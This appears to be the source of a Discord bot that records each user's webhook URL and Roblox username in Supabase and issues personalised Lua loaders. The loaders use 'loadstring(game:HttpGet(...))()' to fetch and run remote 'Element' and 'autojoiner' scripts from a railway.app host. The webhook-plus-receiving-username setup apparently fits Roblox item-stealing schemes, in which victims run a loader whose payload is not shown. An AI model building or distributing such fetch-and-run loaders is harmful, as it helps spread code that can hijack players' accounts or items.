import os
import uuid
import secrets
import discord
from discord import app_commands
from discord.ext import commands
from supabase import create_client, Client

# ---------------------------
# CONFIG
# ---------------------------
DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")
SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_KEY")

supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

ELEMENT_URL = "https://element.up.railway.app/cdn/element.luau"
AUTOJOINER_URL = "https://element.up.railway.app/cdn/autojoiner.luau"

# ---------------------------
# INIT
# ---------------------------
intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)

# ---------------------------
# HELPERS
# ---------------------------
def generate_id():
    return str(uuid.uuid4())

def generate_key():
    return "ELEMENT$" + secrets.token_urlsafe(24)

# ---------------------------
# ON READY
# ---------------------------
@bot.event
async def on_ready():
    try:
        synced = await bot.tree.sync()
        print(f"🔗 Synced {len(synced)} commands")
    except Exception as e:
        print(f"❌ Sync error: {e}")
    print(f"✅ Bot connected as {bot.user}")

# ---------------------------
# SET WEBHOOK
# ---------------------------
@bot.tree.command(name="setwebhook", description="Set your webhook URL")
async def setwebhook(interaction: discord.Interaction, webhook: str):
    user_id = str(interaction.user.id)

    supabase.table("elements").upsert({
        "user_id": user_id,
        "webhook": webhook
    }, on_conflict=["user_id"]).execute()

    await interaction.response.send_message(
        f"✅ Webhook set `{webhook}`", ephemeral=True
    )

# ---------------------------
# SET USERNAME
# ---------------------------
@bot.tree.command(name="setusername", description="Set your Roblox username")
async def setusername(interaction: discord.Interaction, username: str):
    user_id = str(interaction.user.id)

    supabase.table("elements").upsert({
        "user_id": user_id,
        "username": username
    }, on_conflict=["user_id"]).execute()

    await interaction.response.send_message(
        f"✅ Username set `{username}`", ephemeral=True
    )

# ---------------------------
# GENERATE ELEMENT SCRIPT
# ---------------------------
@bot.tree.command(name="generate", description="Generate your Element Script")
async def generate(interaction: discord.Interaction):
    user_id = str(interaction.user.id)

    existing = supabase.table("elements").select("id, username, webhook").eq("user_id", user_id).execute()
    record = existing.data[0] if existing.data else None

    if not record:
        await interaction.response.send_message(
            "❌ Please set webhook and username first using `/setwebhook` and `/setusername`.",
            ephemeral=True
        )
        return

    element_id = record.get("id") or generate_id()

    # Save/update if missing ID
    supabase.table("elements").upsert({
        "user_id": user_id,
        "id": element_id
    }, on_conflict=["user_id"]).execute()

    webhook = record.get("webhook", "⚠️ Not set")
    username = record.get("username", "⚠️ Not set")

    msg = (
        f"## Your Element Script\n"
        f"Webhook: `{webhook}`\n"
        f"Username: `{username}`\n\n"
        f"```lua\n"
        f'ID="{element_id}"\n'
        f'loadstring(game:HttpGet("{ELEMENT_URL}"))()\n'
        f"```"
    )

    await interaction.response.send_message(msg, ephemeral=True)

# ---------------------------
# GENERATE AUTOJOINER SCRIPT
# ---------------------------
@bot.tree.command(name="generate-autojoiner", description="Generate your AutoJoiner Script")
async def generate_autojoiner(interaction: discord.Interaction):
    user_id = str(interaction.user.id)

    existing = supabase.table("elements").select("id, key").eq("user_id", user_id).execute()
    record = existing.data[0] if existing.data else None

    element_id = record["id"] if record and record.get("id") else generate_id()
    key = record["key"] if record and record.get("key") else generate_key()

    # Upsert to Supabase
    supabase.table("elements").upsert({
        "user_id": user_id,
        "id": element_id,
        "key": key
    }, on_conflict=["user_id"]).execute()

    msg = (
        f"## ⚠️ DON'T SHARE! THIS CONTAINS YOUR PRIVATE KEY! ⚠️\n\n"
        f"```lua\n"
        f'KEY="{key}"\n'
        f'loadstring(game:HttpGet("{AUTOJOINER_URL}"))()\n'
        f"```"
    )

    await interaction.response.send_message(msg, ephemeral=True)

# ---------------------------
# RUN
# ---------------------------
bot.run(DISCORD_TOKEN)
